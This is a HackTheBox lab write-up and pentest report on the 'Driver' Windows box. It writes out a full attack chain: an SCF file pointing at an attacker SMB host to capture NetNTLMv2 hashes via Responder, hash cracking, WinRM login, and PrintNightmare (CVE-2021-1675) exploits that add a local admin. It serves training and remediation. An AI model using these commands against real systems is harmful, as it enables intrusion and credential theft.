# Driver

**Platform:** HackTheBox
**OS:** Windows
**Tags:** MFP Portal, SCF Attack, Responder, NetNTLMv2, Hash Cracking, WinRM, PrintNightmare, CVE-2021-1675
**Date:** 2026-10-01

Port 80 runs an MFP firmware update portal behind HTTP Basic auth. Uploaded firmware lands on a file share that a local user browses, so instead of going for a web shell I dropped a malicious SCF file that forces Windows Explorer to authenticate to a Responder listener and leaks the NetNTLMv2 hash. The hash cracks straight against rockyou. WinRM is on 5985 so the credentials get a shell immediately. Tony's PowerShell history shows a RICOH printer driver was recently installed and Print Spooler is running as SYSTEM -- that is PrintNightmare. The exploit loads a malicious DLL as SYSTEM, adds a local admin account, and that account reads the root flag directly by path.

## 1. Enumeration

```bash
nmap -sC -sV 10.129.76.80
```

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth:
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DRIVER; OS: Windows
| smb-security-mode:
|_  message_signing: disabled (dangerous, but default)
```

The HTTP auth realm says "MFP Firmware Update Center" -- printer management portal. WinRM is open on 5985, so credentials mean a shell.

**Dead end - SMB anonymous enum:** Anonymous sessions rejected, nothing came back.

```bash
enum4linux -a 10.129.76.80
```

```
[E] Server doesn't allow session using username '', password ''. Aborting remainder of tests.
```

**Dead end - directory brute force:** Gobuster only found `/images` and `index.php` returning 401.

```bash
gobuster dir -u http://10.129.76.80/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js,txt,bak,zip,json -t 100
```

Tried `admin:admin` on the portal and it worked. The portal has a firmware upload page.

## 2. Foothold

### 2.1 SCF file attack

First thought was a PHP web shell through the upload page. Tried setting up a listener to catch a reverse shell and got a Meterpreter session that died on connection.

**Dead end - Metasploit handler:** Session opened and immediately closed. The web upload is not the right angle.

```
[*] Meterpreter session 1 opened (<ATTACKER_IP>:4444 -> 10.129.76.80:49434) ...
[*] 10.129.76.80 - Meterpreter session 1 closed.  Reason: Died
```

The right read is the printer context: uploaded firmware gets reviewed, which means someone is browsing a file share. An SCF file with an `IconFile` pointing at an attacker-controlled SMB server forces Windows Explorer to authenticate when the folder is opened, handing over the NetNTLMv2 hash to Responder. Naming it with `@` at the front sorts it to the top of the directory so it triggers immediately.

```bash
cat > @evil.scf <<'EOF'
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\pentest.ico
[Taskbar]
Command=ToggleDesktop
EOF
```

```bash
sudo responder -I tun0
```

Upload `@evil.scf` through the firmware page. When tony opens the folder:

```
[SMB] NTLMv2-SSP Client   : 10.129.76.80
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:ec4dbdb0bc787fb3:C3D7348EF20147821EF204A96F951AA8:0101000000...
```

### 2.2 Cracking the hash

**Dead end - over-engineering hashcat:** First run added rules on a CPU-only box. Estimated time came back at 6 days. Switched to a straight dictionary run against rockyou with no rules and it cracked in 2 seconds. Try the plain dictionary before adding rules.

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```
TONY::DRIVER:ec4dbdb0bc787fb3:c3d7348ef2...:liltony
Status: Cracked
```

Credentials: `tony:liltony`

### 2.3 Shell as tony

```bash
evil-winrm -i 10.129.76.80 -u Tony -p liltony
```

```powershell
*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
redacted
```

Checked privileges:

```powershell
*Evil-WinRM* PS C:\Users\tony\Desktop> whoami /priv
```

```
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

No `SeImpersonate`, medium integrity level. No token abuse path. Moved to looking at the application layer.

**Dead end - credential hunting:** `findstr /si password *.txt *.xml *.ini *.config` returned nothing. `cmdkey /list` showed no stored credentials. `reg query HKLM /f password /t REG_SZ /s` returned 264 matches, all Windows defaults.

**Dead end - systeminfo and WMI:** Both blocked for tony. `systeminfo` returned access denied, same for `Get-WmiObject Win32_ComputerSystem`.

## 3. Privilege Escalation

### 3.1 PowerShell history

```powershell
Get-Content C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```

A RICOH printer driver was recently installed and Print Spooler is running as SYSTEM. That is PrintNightmare (CVE-2021-1675). The Spooler allows non-admins to install printer drivers via `AddPrinterDriverEx` without validating the DLL, so pointing it at a malicious DLL means SYSTEM executes it.

### 3.2 PrintNightmare

Using calebstewart's `Invoke-Nightmare`, which embeds the DLL and adds a new local admin:

```powershell
*Evil-WinRM* PS C:\Users\tony\Documents> upload CVE-2021-1675.ps1
Info: Upload successful!
```

**Dead end - loading the script:** Running `.\CVE-2021-1675.ps1` hit the execution policy. Running the file without dot-sourcing meant the function was not defined in scope:

```
File CVE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system.
Invoke-Nightmare : The term 'Invoke-Nightmare' is not recognized
```

Fix: bypass execution policy and dot-source the file so the function loads into the current session.

```powershell
powershell -ep bypass -c ". .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser 'hacker' -NewPassword 'Hacker123!'"
```

```
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

### 3.3 Root

Open a new terminal. If the box reset the IP will have changed -- connect to whatever it respawned as.

```bash
evil-winrm -i 10.129.76.234 -u hacker -p 'Hacker123!'
```

**Dead end - listing Administrator's profile:** `cd C:\Users\Administrator; ls` returned access denied. The profile folder ACL blocks it even as a local admin. Read the flag directly by path instead.

```powershell
*Evil-WinRM* PS C:\Users\hacker> type C:\Users\Administrator\Desktop\root.txt
redacted
```

### Alternative -- cube0x0 Python PoC

The cube0x0 Python version works by hosting `nightmare.dll` on an SMB share and passing it to the target. It ran here but the named pipe kept closing before the DLL loaded:

```bash
python3 CVE-2021-1675.py tony:liltony@10.129.76.80 '\\<ATTACKER_IP>\share\nightmare.dll'
```

```
[+] Bind OK
[+] pDriverPath Found ...UNIDRV.DLL
[*] Executing \??\UNC\<ATTACKER_IP>\share\nightmare.dll
[*] Try 1...
impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING
```

Re-running usually clears it, but `Invoke-Nightmare` is more reliable on this box.

## 4. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** driver.htb
**Address:** 10.129.76.80
**Assessment type:** External network & web application assessment
**Assessment date:** 01 October 2026
**Environment:** HackTheBox laboratory assessment  |  Windows
**Prepared by:** Ledion Mujaj
**Reference:** HTB-DRV-01

---

## 1. Executive Summary

Testing of **driver.htb** identified three findings that together produced full SYSTEM compromise. The MFP Firmware Update Center on port 80 accepted the default credential pair `admin:admin`, granting access to a firmware upload page. Uploaded files are stored on a network share that a local user browses, allowing a malicious SCF file to force Windows Explorer to authenticate to an attacker-controlled SMB listener. The resulting NetNTLMv2 hash was cracked offline against the rockyou wordlist and used to authenticate over WinRM. PowerShell history on the compromised account showed a RICOH printer driver had recently been installed. Print Spooler was running as SYSTEM, making the host vulnerable to CVE-2021-1675 (PrintNightmare). Exploiting this loaded a malicious DLL as SYSTEM and added a new local administrator account, providing unrestricted access to the host.

**Priority recommendations:**

1. Change all default credentials on the MFP portal immediately. Enforce unique, strong passwords and restrict access to the management interface to administrative networks.
2. Restrict write access to the firmware upload share so that non-administrative accounts cannot place files that are subsequently rendered by browsing users.
3. Disable the Print Spooler service on hosts that do not require it. Where it must run, apply the patches addressing CVE-2021-1675 and CVE-2021-34527.

---

## 2. Assessment Scope and Methodology

| Asset | Address | Description |
|-------|---------|-------------|
| driver.htb | 10.129.76.80 | Windows Server; IIS MFP portal on port 80, SMB on 445, WinRM on 5985. |

| Port | Service | Observed detail |
|------|---------|----------------|
| 80/tcp | HTTP | Microsoft IIS httpd 10.0; HTTP Basic auth realm: MFP Firmware Update Center |
| 135/tcp | MSRPC | Microsoft Windows RPC |
| 445/tcp | SMB | Microsoft Windows SMB; workgroup WORKGROUP; message signing disabled |
| 5985/tcp | WinRM | Microsoft HTTPAPI httpd 2.0 |

Testing began with a service scan. The MFP portal was tested for default and common credentials. The firmware upload functionality was reviewed and the file share context identified. A malicious SCF file was crafted and uploaded to capture the browsing user's NetNTLMv2 hash via Responder. The hash was cracked offline with hashcat. WinRM authentication was attempted with the cracked credentials. Post-foothold enumeration covered user privileges, stored credentials, running services and PowerShell history. The Print Spooler service and installed printer driver were identified as the privilege escalation path, and CVE-2021-1675 was exploited using the Invoke-Nightmare script.

---

## 3. Results Overview

| Reference | Finding | Severity |
|-----------|---------|----------|
| F-01 | Default credentials on MFP Firmware Update Center | **Medium** |
| F-02 | SCF file on browsed share captures NetNTLMv2 hash | **High** |
| F-03 | PrintNightmare (CVE-2021-1675) delivers SYSTEM code execution | **Critical** |

**Compromise sequence:**

| Stage | Action | Access obtained |
|-------|--------|----------------|
| 01 | Authenticated to the MFP portal with default credentials `admin:admin`. Identified a firmware upload page whose files land on a browsed network share. | Portal access |
| 02 | Uploaded a malicious SCF file pointing at an attacker-controlled SMB server. When tony browsed the share, Responder captured the NetNTLMv2 hash. Cracked offline against rockyou. | Plaintext credentials (`tony:liltony`) |
| 03 | Authenticated over WinRM as tony. PowerShell history showed a RICOH printer driver install. Exploited CVE-2021-1675 via Invoke-Nightmare to add a local admin account. | SYSTEM / local admin shell |

---

## 4.1 Default Credentials on MFP Firmware Update Center

### F-01   driver.htb:80 -- HTTP Basic auth - MEDIUM

| Field | Detail |
|-------|--------|
| Description | The MFP Firmware Update Center on port 80 accepted the credential pair `admin:admin` without restriction. No account lockout, rate limiting, or CAPTCHA was observed. Successful authentication granted access to a firmware upload page that accepts arbitrary files. |
| Prerequisites | Network access to port 80. No prior knowledge required. |
| Impact | Unauthenticated access to the firmware upload functionality. This is the entry point that enables the SCF share attack in F-02. |
| Affected system | driver.htb:80 -- MFP Firmware Update Center |
| CVSS 3.1 | 5.3 -- AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |
| CWE | CWE-1392: Use of Default Credentials |

**Steps to reproduce:**

1. Navigate to `http://driver.htb/`. A Basic auth prompt appears with the realm "MFP Firmware Update Center".
2. Enter `admin` as both username and password.
3. Observe successful authentication and access to the portal including the firmware upload page.

**Evidence:**

```
# HTTP Basic auth prompt
GET / HTTP/1.1
Host: driver.htb
Authorization: Basic YWRtaW46YWRtaW4=   # admin:admin base64

HTTP/1.1 200 OK
# Portal loaded -- firmware upload page accessible
```

**Remediation:** Change the MFP portal password immediately to a strong, unique value. Restrict access to the management interface to administrative networks or VPN. Implement account lockout after a small number of failed authentication attempts.

**Verification:** Confirm that `admin:admin` no longer authenticates to the portal. Verify that repeated failed login attempts trigger a lockout or alert.

---

## 4.2 SCF File on Browsed Share Captures NetNTLMv2 Hash

### F-02   Firmware upload share -- forced authentication - HIGH

| Field | Detail |
|-------|--------|
| Description | Files uploaded through the firmware portal are stored on a network share that a local user browses using Windows Explorer. An SCF file placed in this share contains an `IconFile` directive pointing at an attacker-controlled SMB server. When Windows Explorer renders the folder containing the SCF file, it automatically authenticates to the attacker's server, sending the browsing user's NetNTLMv2 hash. The hash was captured by Responder and cracked offline in under two seconds against the rockyou wordlist. |
| Prerequisites | Write access to the firmware upload page (obtained via F-01) and a Responder listener reachable from the target. |
| Impact | NetNTLMv2 hash for the local user tony captured and cracked to plaintext. Credentials used to authenticate over WinRM and establish an interactive shell. |
| Affected system | driver.htb -- firmware upload share (browsed by local user tony) |
| CVSS 3.1 | 8.8 -- AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N |
| CWE | CWE-522: Insufficiently Protected Credentials |

**Steps to reproduce:**

1. Start Responder on the attacker interface: `sudo responder -I tun0`.
2. Create an SCF file with `IconFile=\\<ATTACKER_IP>\share\file.ico` and upload it through the firmware portal.
3. Wait for the local user to browse the share. Responder will capture the NetNTLMv2 hash.
4. Crack the hash: `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`.
5. Authenticate over WinRM: `evil-winrm -i 10.129.76.80 -u tony -p liltony`.

**Evidence:**

```
# SCF file contents:
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\pentest.ico
[Taskbar]
Command=ToggleDesktop

# Responder output:
[SMB] NTLMv2-SSP Client   : 10.129.76.80
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:ec4dbdb0bc787fb3:C3D7348EF20147821EF204A96F951AA8:0101000000...

# Hashcat result:
TONY::DRIVER:ec4dbdb0bc787fb3:c3d7348ef2...:liltony
Status: Cracked

# WinRM shell:
*Evil-WinRM* PS C:\Users\tony\Desktop> whoami
driver\tony
```

Attacker IP redacted.

**Remediation:** Restrict write access to the firmware upload share so that uploaded files cannot be rendered by Windows Explorer on the reviewing account's workstation. Disable SMB outbound traffic from internal workstations to untrusted networks at the host firewall level. Rotate the tony account password immediately.

**Verification:** Confirm that an SCF file placed in the upload share does not trigger outbound SMB authentication. Verify that the tony account password has been rotated.

---

## 4.3 PrintNightmare (CVE-2021-1675) Delivers SYSTEM Code Execution

### F-03   CVE-2021-1675 / CVE-2021-34527 -- Print Spooler - CRITICAL

| Field | Detail |
|-------|--------|
| Description | The Windows Print Spooler service was running as SYSTEM and the host had a RICOH printer driver recently installed, confirming the Spooler was actively managing print drivers. CVE-2021-1675 (PrintNightmare) allows a low-privilege authenticated user to call `AddPrinterDriverEx` and cause the Spooler to load a malicious DLL without validating its origin. The DLL executes as SYSTEM. Exploitation used the calebstewart Invoke-Nightmare script, which embeds a DLL payload and adds a new local administrator account. |
| Prerequisites | Local authenticated access (obtained via F-02). Print Spooler running and at least one printer driver installed. |
| Impact | Arbitrary code execution as SYSTEM. A new local administrator account was created, providing unrestricted access to the host including all files, services and credentials. |
| Affected system | driver.htb -- Windows Print Spooler (spoolsv.exe); CVE-2021-1675 / CVE-2021-34527 |
| CVSS 3.1 | 8.8 -- AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| CWE | CWE-269: Improper Privilege Management |

**Steps to reproduce:**

1. Confirm Print Spooler is running: `Get-Service -Name Spooler`.
2. Upload `CVE-2021-1675.ps1` (calebstewart's Invoke-Nightmare) to the target via evil-winrm.
3. Bypass execution policy and dot-source the script: `powershell -ep bypass -c ". .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser 'hacker' -NewPassword 'Hacker123!'"`.
4. Authenticate as the new local admin over WinRM: `evil-winrm -i 10.129.76.80 -u hacker -p 'Hacker123!'`.

**Evidence:**

```
powershell -ep bypass -c ". .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser 'hacker' -NewPassword 'Hacker123!'"

[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll

*Evil-WinRM* PS C:\Users\hacker> type C:\Users\Administrator\Desktop\root.txt
[redacted]
```

**Remediation:** Apply the Microsoft patches for CVE-2021-1675 and CVE-2021-34527. If the Print Spooler is not required on this host, disable it permanently. If it must run, restrict which users can install printer drivers via Group Policy (`Point and Print Restrictions`) and apply the registry mitigations from Microsoft's advisory.

**Verification:** Confirm that the Print Spooler patch level is current. Verify that a non-administrative user cannot call `AddPrinterDriverEx` with a DLL payload. If the Spooler was disabled, confirm it does not restart on reboot.

---

## 5. Remediation and Assessment Closeout

| Priority | Action | Reference |
|----------|--------|-----------|
| Immediate | Patch Print Spooler for CVE-2021-1675 and CVE-2021-34527. Disable if not required. | F-03 |
| Immediate | Change the MFP portal password. Restrict management interface access to administrative networks. | F-01 |
| High | Restrict write access to the firmware upload share. Block outbound SMB to untrusted destinations. | F-02 |

**Test artefacts:** A `hacker` local admin account was created on the target via Invoke-Nightmare and `CVE-2021-1675.ps1` was uploaded to `C:\Users\tony\Documents`. Both should be confirmed removed.
